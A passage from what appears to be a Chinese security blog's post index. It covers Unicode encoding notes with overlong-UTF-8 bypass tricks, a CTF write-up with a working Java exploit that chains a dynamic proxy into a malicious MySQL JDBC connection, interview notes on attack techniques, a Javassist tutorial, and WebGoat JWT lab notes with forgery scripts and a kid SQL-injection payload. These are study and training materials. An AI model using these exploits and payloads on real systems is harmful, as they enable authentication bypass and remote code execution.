b&#x27;\\x4f\\x60&#x27;# 显式指定小端（无 BOM）print(&#x27;你&#x27;.encode(&#x27;utf-16le&#x27;))  # b&#x27;\\x60\\x4f&#x27;# 辅助平面字符 &#x27;𠀀&#x27;（U+20000）print(&#x27;𠀀&#x27;.encode(&#x27;utf-16be&#x27;))  # b&#x27;\\xd8\\x40\\xdc\\x00&#x27;（代理对）\n\n\nUTF-16 的特点\n定长与变长混合：\n\n\n\nBMP 字符：2 字节。\n辅助平面字符：4 字节（代理对）。\n\n\n\n\n字节序敏感：需明确大端或小端（或依赖 BOM）。\n适用场景：\n\n\n\nWindows 系统内部（如 wchar_t）。\nJava&#x2F;C# 的字符串内存表示。\n\n\n\nUTF-8 vs. UTF-16\n\n\n特性\nUTF-8\nUTF-16\n\n\n\n最小字节数\n1（ASCII）\n2（基本字符）\n\n\n最大字节数\n4\n4（代理对）\n\n\n字节序\n无（单字节存储）\n需考虑大端&#x2F;小端（BOM）\n\n\n适用场景\n互联网、文本文件、数据库\n操作系统内部（如 Windows&#x2F;Java）\n\n\n\n总结所有字符的Unicode码点是唯一的，可以通过hex(ord(str))的方式得到16进制格式的码点。根据得到的码点，套用不同的编码方式，就可以得到不同编码下的字符。\n高位丢失情况先看一个例子\npackage solution;public class tmp &#123;    public static void main(String[] args) &#123;        StringBuffer stringBuffer = new StringBuffer();        stringBuffer.append(&quot;你&quot;);        char c = stringBuffer.charAt(0);        System.out.println(&quot;字符转十进制整数（Unicode码点的整数形式）：&quot;+(int) c);        String format = String.format(&quot;dec转hex：%04x&quot;,(int) c);        System.out.println(format);        byte c1 = (byte) c;        System.out.println(&quot;转成byte类型（高位丢失,4f60剩60,60转dec就是96）：&quot;+c1);        System.out.println((char) c1);        byte i = 127;   //byte的范围是-128——127，用的补码表示法    &#125;&#125;\n\n输出结果：\n字符转十进制整数（Unicode码点的整数形式）：20320dec转hex：4f60转成byte类型（高位丢失,4f60剩60,60转dec就是96）：96`\n\n\n\n这里很好地展示了高位丢失的情况。因为byte只有八个字节，而char有16个字节（char 在Java中本质上是一个16位的Unicode字符）。\n这个性质有时候可以用来绕过一些过滤。比如D^3CTF25的d3jtar那题。\nD3CTF-d3jtar | 1diot9’s Blog\nUTF8 Overlong Encoding根据前面学习过的UTF8编码，我们知道，’A’对应的码点是41，转换成二进制就是0010 0001，然后根据0xxxxxxx的方式补位，得到的utf8编码就是0010 0001，转换成16进制就是 41。但是，我们可以在码点前面补零，将A的码点变成0000 0010 0001，然后根据110xxxxx 10xxxxxx补成两个字节。即11000000 10100001\n转成16进制就是C0A1\n这样就得到了’A’的UTF8 Overlong Encoding形式。\n如果没有对UTF8编码进行校验的话，就可以尝试通过这种方法绕过，比如Java的原生反序列化。\n参考UTF-8 Overlong Encoding导致的安全问题 | 离别歌\n","categories":["其他知识"],"tags":["Java","其他知识","Python"]},{"title":"羊城杯2020-a_piece_of_java","url":"/2025/06/19/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-a-piece-of-java/","content":"知识点动态代理触发实体类的危险方法+jdbc mysql反序列化\n解题过程先看一下Controller里面的代码：\n整体的逻辑还是比较简单的，就是在index传入username和password，然后把这些数据封装到UserInfo对象，并存储到Cookie作为登录凭证。当我们访问hello的时候，Cookie中的数据会被deserialize，我们的username和pasword也就出来了。\n那么应该可以想到这么一些东西：deserialize的数据在cookie里，而cookie的数据我们可控，即我们可以操纵反序列化的数据\n上面的东西是题目的一环，不过条件还没用完，我们去看看其他文件，能够发现DatabaseInfo里面有数据库连接的行为：\nconnect()里面的密码是直接拼接的，意味着我们可以在后面添加任意参数。然后这个checkAllInfo又调用了connect()。那怎么样才能触发这个checkAllInfo呢？这个就要用到我们的最后一个条件，动态代理。\n去看看这个动态代理：\n很明显，这个invoke里面是有checkAllInfo的，而且只要调用被动态代理类的方法，这个invoke就肯定会被调用。那整条链子就出来了，先直接看EXP：\npackage gdufs.challenge.web;import gdufs.challenge.web.invocation.InfoInvocationHandler;import gdufs.challenge.web.model.DatabaseInfo;import gdufs.challenge.web.model.Info;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.Proxy;import java.util.Base64;public class EXP &#123;    public static void main(String[] args) throws IOException &#123;        DatabaseInfo databaseInfo = new DatabaseInfo();        databaseInfo.setHost(&quot;127.0.0.1&quot;);        databaseInfo.setPort(&quot;3309&quot;);        databaseInfo.setPassword(&quot;123456&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;);        databaseInfo.setUsername(&quot;root&quot;);        InfoInvocationHandler infoInvocationHandler = new InfoInvocationHandler(databaseInfo);        Info info=(Info) Proxy.newProxyInstance(databaseInfo.getClass().getClassLoader(),databaseInfo.getClass().getInterfaces(), infoInvocationHandler);        byte[] bytes = serializeBytes(info);        System.out.println(Base64.getEncoder().encodeToString(bytes));    &#125;    public static  byte[] serializeBytes(Object object) throws IOException &#123;        ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeObject(object);        return byteArrayOutputStream.toByteArray();    &#125;&#125;\n\n我这里正向整理一遍：deserialize后得到我们设置的DatabaseInfo的动态代理，赋值给info；info.getAllInfo()触发动态代理里面的invoke()；invoke里面的checkAllInfo()触发DatabaseInfo里面的connect()。从而触发漏洞。\n接下来只要用python在3309端口开一个fake mysql的服务，然后返回恶意的序列化数据就可以了，就是之前学的mysql jdbc反序列化里面的内容。\n","categories":["CTF-Java"],"tags":["CTF-Java"]},{"title":"2025暑期面试汇总","url":"/2025/06/19/2025%E6%9A%91%E6%9C%9F%E9%9D%A2%E8%AF%95%E6%B1%87%E6%80%BB/","content":"深信服一面–安全攻防实习生讲了半个小时，反正不会的稍微讲讲，会的往详细讲。\n1、自我介绍\n2、sql注入了解吗？DNS外带注入知道吗？SQL提权了解吗\n把几种注入方式都讲了一遍，绕过的方法也讲了一遍。\nDNS外带不清楚，好像只能windows用，对版本也有要求。\n提权只知道UDF，没多讲，不会。\n3、XSS有哪几类\n不怎么熟悉，反射，存储，DOM\n4、SSRF知道吗？绕过方式呢？\n常规讲。\n5、Redis的攻击面\n不知道，只知道有个定时任务相关的。后面说这个是CTF考的比较多才问，我说我现在主要学习Java安全相关的，就把话题引入Java了。\n6、Java安全相关\n库库一顿讲。CC链，fastjson各版本绕过，JNDI+JDBC连打。反正说了很多，也讲的比较详细。\n7、有没有挖到过Java相关的漏洞\n没有，太难了。讲了目前还是以复现为主。于是开始讲之后的安排：先代码审计，熟悉基本漏洞并实现自动化挖掘；然后再挖开源系统漏洞，顺带分析了一下难点和大概思路。\n8、给你一个流量包，能分析出里面的恶意流量，并推导出0day的Poc吗\n不会，反问环节了解到，这是公司内部在做的事。\n9、都是自学的吗？一般怎么学习？\n是。看github学习路线+博客。\n10、反问环节\n实习要做什么？GO用的多吗？有没有住房补贴交通补贴？二面什么时候？\n知道创宇–安全研究实习生主要是基于自我介绍和简历提问，追问很多。\n\n自我介绍\n问了对实习时间的安排\n学校学习的课程内容\nCTF比赛经历\nWeb基础漏洞有哪些(我以php展开讲)？延时盲注等的构造思路。文件上传学了什么？\nphp反序列化和Java反序列化的异同\nJava中的Web基础漏洞了解吗？Java的Web开发框架用过吗？\nfastjson各版本漏洞原理+修复；fastjson结合原生反序列化\n不能出网的话，反序列化怎么利用？只能写文件呢，不出网怎么利用？\ntabby和codeql学到什么程度了，能简单讲一下吗？\n打CTF的时候，有用python写过POC吗\nJava序列化的数据结构了解吗？ （学过，但是忘了，悲）\nJDBC能实现RCE的原理了解吗？\n平时有写过小项目或者小脚本之类的吗？  （得赶紧复刻一个ysoserial了）\n有没有不在简历上的，比较有优势的地方，描述一下\nCTF或者写代码，有和队员合作交流的经历吗\t（其实可以把在github合作完成大作业的经历讲）\n自己github学习项目的介绍\nsqlite攻击的原理，为什么加载.so文件能实现RCE  （个人博客上的内容）\nSpringBoot 内存马注入原理\n大概一周内有结果\n\n绿盟一面–安全研究员\n自我介绍\n问了上课忙不忙，其实就是问能不能保证实习时间\n大学课程里和安全相关的课；排名情况\nCTF有参加过什么比赛吗\n为什么会选择做Java安全这块\nCC链讲一下\t（挑了CC6讲）\n高版本jdk 怎么绕过 TemplatesImpl没法使用的情况。就是jdk17一般怎么打。\n内存马常见注入方式有哪些\n拿到Java服务器的RCE，怎么去做持久化\n文件上传，RCE相关漏洞的验证poc写的多吗\n有参加过学校组织的护网等偏实战的项目吗\n平时python用的多不多。CTF-Web 是不是python用的比较多\n有没有其他项目经历\n讲了公司的一些业务 （星宇实验室，云安全，云原生，组件poc验证，poc集成到扫描器）。问是否感兴趣。说明工作量可能比较大，问到岗时间。\n对go语言有了解吗\n反问环节\n\n奇安信–安全研究问题都是偏实战化的，追问很多，让我知道了很多自己的不足。\n\n自我介绍\n内存马有哪些了解\n发现了一个命令执行的漏洞，怎么去注内存马？\n\n不知道，说是用agent技术动态attach\n\n哪些内存马是tomcat里特有的\n\n一个post接口，存在Java原生反序列化漏洞，怎么利用？\n\n\n怎么去找里面有哪些依赖？\n怎么发一个payload，把常见的依赖全探测出来？\n\n\n确定有CB链，但是打不通，可能是什么原因？\n\n\n回答的都是WAF相关的，但是实际想让你回答不同版本依赖SerializeUID不同，会导致反序列化失败。\n\nhessian反序列化了解吗？hessian-only-jdk的链子讲一下？MimeTypeParameterList链对调用的方法有没有什么限制？\n\n限制public方法，参数类型也有限制。\n\nJava反序列化 bypass waf 有什么方法吗\n\n二次反序列化，UTF8Overlong，JNI\n\nshiro反序列化了解吗？\nnginx环境下，shiro cookie头过长怎么解决？\n\n支持POST，可以从body里拿；分段发送；\n我还说了写webshell，于是问了下面的问题：要是不知道网站目录，怎么写shell？\n\n有尝试自己去挖利用链吗？讲一下最近分析出来的比较有趣的链。\n.NET 方面的漏洞有了解吗？\n有自己去审计过一些系统吗？开源的，闭源的都行。\n有挖过逻辑漏洞吗？\n觉得自己的开发能力怎么样？ 有试过写一下利用链工具之类的吗？\n网上开源的webshell工具有哪些可以改进的地方？\n反问环节\n\n杭州默安科技最后反问的时候知道，工作内容主要是各种设备的开发，包括RASP，IASP，AI动态检测等，感觉比较先进。\n\n自我介绍\n讲一下 Java 原生反序列化的原理\n讲一下知道的一些利用链\n讲一下fastjson反序列化和原生反序列化的不同？里面常用的链子有哪些\n反序列化可以造成什么危害？\n怎么自动化地挖掘新链？\nJNDI知道吗，讲一下？\n内存马知道吗，讲一下？\n怎么动态检测内存马？怎么做内存马攻防？\nJava开发有做过吗？\n反问环节\n\n微步在线-安全实习生（漏洞研究）工作内容：做应急响应，负责维护公司的漏洞库，主要是做各种漏洞的分析，有师傅直接带你\n根据简历问的，也有适当的追问。\n\n他先自我介绍了一下，介绍了工作职责\n自我介绍\nCTF比赛中有拿到过名次吗？\n有没有加入什么联合战队\n讲一下简历上写的，高版本fastjson在原生反序列化中的使用（就是toString–&gt;getter那个）\nLdapAttribute链知道吗？\nJNDI和JDBC Attack结合的打法知道吗？\n\n我讲了JNDI + JDBC 的组合打法，就是 getObjectInstance 的那个。\n\n不同JDBC有不同的绕过，能讲一下mysql JDBC 的一些绕过技巧吗？比如URL编码之类的。\nJDBC里，除了有个SocketFactory打法，还有一个什么函数？\n\n后面说是有一个SSLSocketFactory，没听说过。\n\nldap，如果 trustcodebase 为 false，还有哪两种利用方法？\nreadObject–&gt;toString–&gt;getter–&gt;JDBC的打法知道吗？BadAttribute的链子被ban了，还有别的readObject–&gt;toString的链吗？\n除了fastjson和JDBC、JNDI的漏洞，还有别的熟悉的组件的漏洞吗？\n\n讲了shiro\n\nshiro中，用来判断 key 是否正确的两个核心类是什么？\n\nSimplePrivilegeCollection\n\n有自己写过内存马吗？不用工具生成的。\n了解过Agent吗？Rasp知道吗？\n简历上写自己能独立分析1day，能说一下吗？\n\n其实还不是很会，被拷打了，悲\n\n前一段时间，有个议题，讲了Apache Inlong 的绕过，有看吗？\n\nhttps://github.com/yulate/jdbc-tricks/blob/main/real-world-case/README.md\n可惜没来得及看。\n\n平时有写过一些POC工具吗\n\n又被拷打了，简历上不该吹牛的。放假后得赶快把小工具写起来。\n\n静态分析工具，Tabby，CodeQL用过吗\n\n反问环节\n\n长亭科技–安全研究工程师\n自我介绍\n学校是有人带还是一个人学？\n平时的学习方法，一天的学习规划\n安全开发主要用什么语言，java那里二开过什么工具\n比较擅长的漏洞类型有哪些\n简单讲一下CB链的优化方式，CB链的原理，CB链默认需要依赖CC组件吗；CC链的TransformerInvoker；CC链里toString为入口的链子；还有别的以toString为入口的链子吗\n黑盒场景，可以反序列化请求体，怎么探测可利用的gadgets；说一下DNS探测的原理；不报错，但是能探测\nfastjson利用链的注意点；有注意过一个随机的问题吗（应该指的是POJONode的那条链子）\n还是黑盒gadgets探测，但是不出网，也没有回显，怎么探测？（其实直接sleep一下就行，当时没想到）\n\n我一开始讲直接打内存马，但是反问我如果不知道远程是什么中间件\n\n讲一下文件上传的漏洞；图片马怎么生成，二次渲染绕过\n有了解过commons-upload组件吗\n\n没了解过，之后记得看\n\nJava的JDBC，JNDI利用有了解吗；常见JDBC及利用方式；有了解过postgreSQL的JDBC吗，p神师傅写过关于这个的文章，有看过吗（没看过，惭愧了，现在还是太功利，太着急，感觉比赛里不常考的就不想学）\nmysql JDBC不出网，怎么把pcap文件上传进去；ascii jar方法了解吗\n\nascii jar是p神师傅文章里的非预期解https://www.leavesongs.com/PENETRATION/springboot-xml-beans-exploit-without-network.html  是结合postgre写文件的一种方法\n\n讲一下SSRF形成原理，黑盒怎么测；常见绕过技巧；URL跳转绕过有了解吗(没了解，记得看)\nJava中的绕过trick知道吗；比如ban了http协议（其实是问你别的协议，比如file协议除了写文件还能干嘛）；file协议能列目录吗，能相对目录读文件吗；netdoc协议知道吗（其实这里在问SSRF的代码审计了，可惜还没接触过）\n有Java代码审计基础吗，php的呢；web框架的基础不是特别好是吗\n有了解过web安全是做什么的吗，为什么想投这个岗位呢；能实习多久呢\n反问环节\n\n工作内容：需要有代码审计基础，复现一些最新的漏洞，基于commit；做一些应急；打ctf和漏洞挖掘比赛；漏洞利用，waf绕过\n总结最后阴差阳错的去绿盟的安全服务，那个面试没记录，因为当时觉得大概率不会进，因为毕竟是想去安全研究岗。没想到就那个安全服务岗过了，过的还特别快，面试到offer就3个小时左右。\n经过这么多面试，知道了很多自己的不足，也大致了解到安全研究岗的要求。说实话，一个安全研究的offer都没拿到还是有点失落的。\n后面需要把代码审计，工具二开搞好，再后面要尝试自己找系统审计，或者分析1day，或者利用链挖掘。总之，不能再急于求成了，需要静下心来学习。\n\n\n","categories":["面试"],"tags":["面试","实习"]},{"title":"Javassist初见","url":"/2025/07/11/Javassist%E5%88%9D%E8%A7%81/","content":"前言在写序列化数据生成工具时，TemplatesImpl里的bytes[][]往往都是由javassist动态生成的。javassist依赖相较于asm依赖，使用起来更加简单，因为javassist更像是在操作类，而asm就是在操作字节码了。这里介绍一下javassist的基本用法，另外自己在使用javassist时，遇到了不少坑，这里也来总结一下。\n基本使用直接看代码，我写注释了：\npackage com.idiot9;import javassist.*;public class CreateMyTest &#123;    public String address;    public CreateMyTest() &#123;        System.out.println(&quot;ctConstrutor&quot;);    &#125;    public static void main(String[] args) throws Exception &#123;        ClassPool pool = ClassPool.getDefault();        CtClass MyTest = pool.makeClass(&quot;MyTest&quot;);        //添加字段        CtField name = new CtField(pool.get(&quot;java.lang.String&quot;), &quot;name&quot;, MyTest);        name.setModifiers(Modifier.PRIVATE);        MyTest.addField(name, CtField.Initializer.constant(&quot;1diot9&quot;));        CtField address = CtField.make(&quot;public String address;&quot;, MyTest);        MyTest.addField(address);        //添加构造方法        CtConstructor ctConstructor = new CtConstructor(new CtClass[]&#123;&#125;, MyTest);        ctConstructor.setBody(&quot;System.out.println(\\&quot;ctConstrutor\\&quot;);&quot;);        MyTest.addConstructor(ctConstructor);        //添加方法        CtMethod hello = new CtMethod(CtClass.voidType, &quot;hello&quot;, new CtClass[]&#123;&#125;, MyTest);        hello.setModifiers(Modifier.PUBLIC);        hello.setBody(&quot;System.out.println(\\&quot;hello\\&quot; + name);&quot;);        MyTest.addMethod(hello);        CtMethod tmp = CtMethod.make(&quot;    public void tmp()&#123;\\n&quot; +                &quot;        System.out.println(\\&quot;tmp\\&quot;);\\n&quot; +                &quot;    &#125;&quot;, MyTest);        MyTest.addMethod(tmp);        //添加静态代码块        CtConstructor staticBlock = MyTest.makeClassInitializer();        staticBlock.setBody(&quot;System.out.println(\\&quot;staticBlock\\&quot;);&quot;);        String s = &quot;System.out.println(\\&quot;staticBlock2\\&quot;);&quot;;        MyTest.makeClassInitializer().insertAfter(s);        //添加父类        CtClass superClass = pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);        MyTest.setSuperclass(superClass);        //输出字节码        MyTest.writeFile(&quot;./src/main/java/&quot;);    &#125;    public void tmp()&#123;        System.out.println(&quot;tmp&quot;);    &#125;&#125;\n\n这里介绍了几种常用的方法：创建字段，创建方法，创建构造方法，创建静态代码块，继承父类\n类搜索相关javassist必须要找到对应的类才能进行动态创建，所以搞清楚它的默认搜索路径和怎么添加路径很重要。下面来简单介绍一下。\n首先，会加载rt.jar中的核心包，包括：java.lang包的所有类，java.util，java.net，java.math，java.nio，java.swing，java.awt，java.lang.reflect，java.lang.invoke。注意，这上面的都是加载单个包下的类，不包括子包里的内，这一点很重要。\n然后介绍一下第三方依赖的搜索情况。\n如果你在pom里导入了依赖，那么你可以通过 pool.get(“org.apache.commons.beanutils.BeanComparator”); 的方式直接获取到类。但是，如果你没有在pom里导入依赖，就需要手动添加类搜索路径，比如添加一个jar包路径：pool.insertClassPath(“D:\\repository\\commons-beanutils\\commons-beanutils\\1.9.4\\commons-beanutils-1.9.4.jar”); 这样javassist就能找到这个包中的所有类。\n除了在get类的时候有搜索问题，在动态创建方法时也会有问题。首先看一下下面的代码：\npublic class CreateOutPackage &#123;    public static void main(String[] args) throws Exception &#123;        ClassPool pool = ClassPool.getDefault();        //insertClassPath影响类搜索范围，pom里导入的依赖，默认在搜索范围        pool.insertClassPath(&quot;D:\\\\repository\\\\commons-beanutils\\\\commons-beanutils\\\\1.9.4\\\\commons-beanutils-1.9.4.jar&quot;);                CtClass ctClass = pool.makeClass(&quot;Test&quot;);        String staticBlock = &quot;BeanComparator beanComparator = new BeanComparator();&quot;;        ctClass.makeClassInitializer().insertAfter(staticBlock);    &#125;&#125;\n\n是不是觉得没有任何问题？但是运行后会发现报错：\n报错原因为：找不到BeanComparator类。这里你可能会想，上面不都insertClassPath了吗，为什么还找不到呢？这是因为，我们没有写全限定名。举个例子，存在两个同名类，com.A和net.A，那么，如果你只写A，javassist怎么知道是哪一个呢？所以我们修改代码如下：\npublic class CreateOutPackage &#123;    public static void main(String[] args) throws Exception &#123;        ClassPool pool = ClassPool.getDefault();        //insertClassPath影响类搜索范围，pom里导入的依赖，默认在搜索范围        pool.insertClassPath(&quot;D:\\\\repository\\\\commons-beanutils\\\\commons-beanutils\\\\1.9.4\\\\commons-beanutils-1.9.4.jar&quot;);        ctClass = pool.makeClass(&quot;Test&quot;);        String staticBlock = &quot;org.apache.commons.beanutils.BeanComparator beanComparator = new org.apache.commons.beanutils.BeanComparator();&quot;;        ctClass.makeClassInitializer().insertAfter(staticBlock);    &#125;&#125;\n\n这样一来就没有报错了。\n不过，每次都要写全限定名是不是觉得很麻烦？所以，javassist还提供了另外一个方法：pool.importPackage(“org.apache.commons.beanutils”); 这个的效果就相当于每次在类最顶上进行import，回忆一下，当我们import后，是不是只需要写SimpleName就行了？这里importPackage的效果是一样的。\n于是，我们可以再修改代码如下：\npublic class CreateOutPackage &#123;    public static void main(String[] args) throws Exception &#123;        ClassPool pool = ClassPool.getDefault();        //insertClassPath影响类搜索范围，pom里导入的依赖，默认在搜索范围        pool.insertClassPath(&quot;D:\\\\repository\\\\commons-beanutils\\\\commons-beanutils\\\\1.9.4\\\\commons-beanutils-1.9.4.jar&quot;);        //importPackage影响代码写法，是写全限定名还是写SimpleName        pool.importPackage(&quot;org.apache.commons.beanutils&quot;);        CtClass ctClass = pool.makeClass(&quot;Test&quot;);        String staticBlock = &quot;BeanComparator beanComparator = new BeanComparator();&quot;;        ctClass.makeClassInitializer().insertAfter(staticBlock);    &#125;&#125;\n\n这样看起来是不是简洁很多？\n遇到的坑在写SpringInterceptor内存马时，遇到一个很奇怪的点。我定义了一个command方法，并在preHandle方法中调用：\n但是这样会报错：\n当我把最底下的command方法删除后就行了。我一开始以为是command方法的问题，但是后来发现直接照搬方法体到preHandle里竟然可以，于是也不是command方法的问题。\n后来不知怎么灵机一动，把command调用上面的String command改成了String cmd，就好了：\n原来这里同一个类里的变量名和方法名不能一样。\n参考https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/#Javassist\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"WebGoat靶场-身份认证缺陷","url":"/2025/07/22/WebGoat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/","content":"前言简单的部分就一笔带过了。虽然有些是之前学过的，但这里从代码审计的角度再看一遍，加深印象。现在还在想一个问题，是边写边做笔记，还是写完再做笔记更好？这里先选择边写边做试试。\n二因素认证绕过抓包后找到对应的方法，直接看源码：\n要success，先要不进入上面的if，然后进入下面的if。\n先看上面if的判断。\npaseSecQuestions是只留下含有secQuestion的POST参数，即留下安全问题的答案，具体方法如下：\n默认的secQuestion参数是secQuestion0和secQuestion1，我们可以改成任意包含secQuestion的参数。\n然后跟进didUserLikelylCheat方法，具体代码：\n我们需要返回false，这里让secQuestion参数不是secQuestion0和secQuestion1就行，我这里改成secQuestionA和secQuestionB。理论上这里直接去掉这两个参数都行，但是这样后面会出问题。\n接着看第二个if，即verifyAccount方法：\n这里解释了为什么不能把secQuestion参数删除，删了就过不了这里的第一个if了。下面两个if由于我们把secQuestion改成了secQuestionA&amp;secQuestionB，所以不用知道安全问题的答案也能通过。\n最终报文：\n明文传输这个很简单，就是抓包后得到的是明文，这样被嗅探的话就很危险。具体不演示了，抓包就行。\nJWTjwt解码这个很简单，直接base64解码就行，推荐用jwt.io这个网站：\n空签名绕过这关需要以admin身份去reset。点击任意一个vote按钮，都提示我们是guest，需要先登录：\n看一下cookie，发现虽然有token，但是是空的：\n但是这里又没有login的登录框，所以去看源码吧。\n能够发现有一个login方法：\nif判断需要我们传入一个特定的user，不然就会进入else，返回一个空的token。这个特定的user是硬编码，在上面找到：\n同时55行也给了jwt的key，先有个印象。\n访问&#x2F;login后，即可获得token：\n后来才知道，TomJerrySylvester原来是三个用户，不过不影响：\n\n接下来切换到tom，解码他的token：\n这里可以用none加密绕过，原因在resetVotes方法里。首先，为什么直接去看resetVotes方法？因为我们的目标就是reset，所以优先找最接近的方法。下面是具体代码：\n注意这个parse，这个parse是不会验证用户提供的token签名是否与真实的token签名一致，因此签名的作用形同虚设，可以直接通过none绕过，具体如下：直接把签名算法部分改成none，然后在下面直接修改payload部分即可。最后更改token，再次reset就行了。\n那么，验证签名的jwt解析代码怎么写？其实很简单，把parse方法改成parseClaimsJws即可：\njwt密钥暴力破解当使用弱密码时，我们可以尝试暴力破解或字典破解jwt的key，这里推荐使用jwt_tool：https://github.com/ticarpi/jwt_tool\n成功找到victory就是密钥：\n另外，查看源码可以发现一共有5个key，每次会随机一个，而且实际上的JWT_SECRET是单词进行base64编码的：\n\n本来还是想用jwt.io，但是那边说key太短，没法加密：\n所以写个脚本加密，直接照搬题目的加密逻辑就行了：\n过期token重放这个的重点也在拿到key，没key是改不了的。\n还是先简单做一下黑盒测试，对这个关卡抓包，可以发现：\n这个就是给我们发放token的过程，去看对应代码：\n过程很简单，就是根据我们的user和password发token。这里的token有两个：1、普通的token，有iat(签发时间)、admin、user、算法是HS512   2、refreshtoken，随机产生的    这两个token最后都存入一个叫tokenJson的HashMap里。\n接着看重点，即过关条件的代码：\n有两种过关方式，两者的共同条件都是JWT中的user&#x3D;Tom\n1、空签名：这个很简单，alg改成none，然后直接修改即可\n\n2、过期token重放：这个需要先去找到tom之前的token，靶场给我们提供了：\n找到tom之前的token后解码，发现token2018年就过期了：\n\n现在的目标就是找出key，然后改时间。key硬编码在源码中，所以写个脚本重新生成JWT就行，注意算法是HS512，这个卡了我好久：\npackage tmp;import io.jsonwebtoken.Jwts;import io.jsonwebtoken.SignatureAlgorithm;import java.time.Instant;import java.util.Calendar;import java.util.Date;public class jtw &#123;    private static final String JWT_SECRET = &quot;bm5n3SkxCX4kKRy4&quot;;    public static String getSecretToken() &#123;        return Jwts.builder()                .setIssuedAt(Calendar.getInstance().getTime())                .setExpiration(Date.from(Instant.now().plusSeconds(600)))                .claim(&quot;user&quot;, &quot;Tom&quot;)                .claim(&quot;admin&quot;, &quot;false&quot;)                .signWith(SignatureAlgorithm.HS512, JWT_SECRET)                .compact();    &#125;    public static void main(String[] args) &#123;        String secretToken = getSecretToken();        System.out.println(secretToken);    &#125;&#125;\n\n然后在请求体中替换token即可。\njku伪造简单理解： JWT 的 jku 字段可以指向一个远程 URL，表示验证 token 时应从该 URL 下载公钥。攻击者可以伪造这个 URL 指向自己控制的服务器，从而用自己的私钥签发伪造的 token，并通过验证。 \n首先，还是抓包delete请求，看看token：\n目标很明确，生成自己的RSA256密钥对，将jku指向自己的公钥存放URL，修改username为Tom后用自己的私钥签名。\n先让ai写一段脚本生成密钥：\nfrom cryptography.hazmat.primitives.asymmetric import rsafrom cryptography.hazmat.primitives import serialization# 生成私钥private_key = rsa.generate_private_key(    public_exponent=65537,    key_size=2048)# 导出私钥 PEMprivate_pem = private_key.private_bytes(    encoding=serialization.Encoding.PEM,    format=serialization.PrivateFormat.PKCS8,    encryption_algorithm=serialization.NoEncryption())# 生成公钥public_key = private_key.public_key()# 导出公钥 PEMpublic_pem = public_key.public_bytes(    encoding=serialization.Encoding.PEM,    format=serialization.PublicFormat.SubjectPublicKeyInfo)# 写入文件with open(&quot;./rsa/private.pem&quot;, &quot;wb&quot;) as f:    f.write(private_pem)with open(&quot;./rsa/public.pem&quot;, &quot;wb&quot;) as f:    f.write(public_pem)print(&quot;✅ RSA256 密钥对已生成：private.pem 和 public.pem&quot;)\n\n然后，把公钥写成json形式，这个我也是问了ai才知道，前面一直错：\n&#123;  &quot;keys&quot;: [    &#123;      &quot;kty&quot;: &quot;RSA&quot;,      &quot;use&quot;: &quot;sig&quot;,      &quot;alg&quot;: &quot;RS256&quot;,      &quot;kid&quot;: &quot;public&quot;,      &quot;n&quot;: &quot;waG38ngPzF_qHctvoZywVkCCYCRrII9agN3sE-Tb0djiyY_0SaRi-GJttO8FT0pGysWR71p7SzMUQV15DctIcKFACLPgsWX_J_ubd7AkcNDZtj5usdODid37SA8Pflj-Ie83etC4fqcQVLNPeZkqYA2pY5y_OuttiFpwWaxpO6GVSKCyK8P3Op9rNqfoB5FdS90axTf_Peq3cNhKgRlfzrmYP9KA7w8j4wQB6YiK7FKyy05VLzAFUeuupPDLgZ3HMaD3nfE55YkAr7vJkrdg-9qh3L6uvteWj84eDRXK-lvWXbY0VMQGCj4qJXzuogHqsVggyM8E4GUEeQghOTlR6Q&quot;,      &quot;e&quot;: &quot;AQAB&quot;    &#125;  ]&#125;\n\n具体含义如下：\n\n建议让AI生成，没接触过rsa加密很容易错，把公钥提供给ai就行。\n创建一个public.json文件，然后在同目录下开一个python http服务(python -m http.server 7778)\n最后私钥签名即可，过期时间别忘记改：\n最后抓包改token就行了：\nkid注入kid的含义在上面学过了，就是取出对应的签名密钥。下面看关键代码：\n获取密钥的方式在这个重写方法中，调试一下能跟进去。另外要注意，key被查询出后，会进行一次base64解码再用于签名验证，所以之后注入时需要将你的密钥base64加密后再注入。\n总任务还是获取key，这里有两种方法。\n1、直接由调试获取它原本的key\n这种是非常规打法，因为现实环境不可能在审计时连上它的数据库，但这里还是讲一下。\n获取key：\n\n然后写脚本签名即可：\npublic class jtw &#123;    private static final byte[] JWT_SECRET = Base64.getDecoder().decode(&quot;qwertyqwerty1234&quot;);    public static String getSecretToken() &#123;        return Jwts.builder()                .setIssuedAt(Calendar.getInstance().getTime())                .setHeaderParam(&quot;kid&quot;, &quot;webgoat_key&quot;)                .setHeaderParam(&quot;typ&quot;, &quot;JWT&quot;)                .setExpiration(Date.from(Instant.now().plusSeconds(6000)))                .claim(&quot;username&quot;, &quot;Tom&quot;)                .claim(&quot;admin&quot;, &quot;false&quot;)                .signWith(SignatureAlgorithm.HS256, JWT_SECRET)                .compact();    &#125;    public static void main(String[] args) &#123;        String secretToken = getSecretToken();        System.out.println(secretToken);    &#125;&#125;\n\n2、注入kid，这个就是常规方法。还是看一下主要逻辑代码：\n题目默认的kid是webgoat_key，因此我们如果想通过注入来指定任意key的话，可以将kid写成下面的值：\n&#x27; union select &#x27;a2V5&#x27; from jwt_keys where id = &#x27;webgoat_key\n\na2V5 base64解码就是key，可以自己设置别的值。\n其实还试过直接注释掉，但会报错，当时是这样写的：\n&#x27; union select &#x27;a2V5&#x27;-- \n\n报错为： unexpected end of statement  \n后面发现似乎必须有个from的操作，双横杠注释后面的空格不加也行，比如这样：\n&#x27; union select &#x27;a2V5&#x27; from jwt_keys--\n\n然后将自己的kid注入即可：\npublic class jtw &#123;    private static final String JWT_SECRET = &quot;a2V5&quot;;    public static String getSecretToken() &#123;        return Jwts.builder()                .setIssuedAt(Calendar.getInstance().getTime())                .setHeaderParam(&quot;kid&quot;, &quot;&#x27; union select &#x27;a2V5&#x27; from jwt_keys where id = 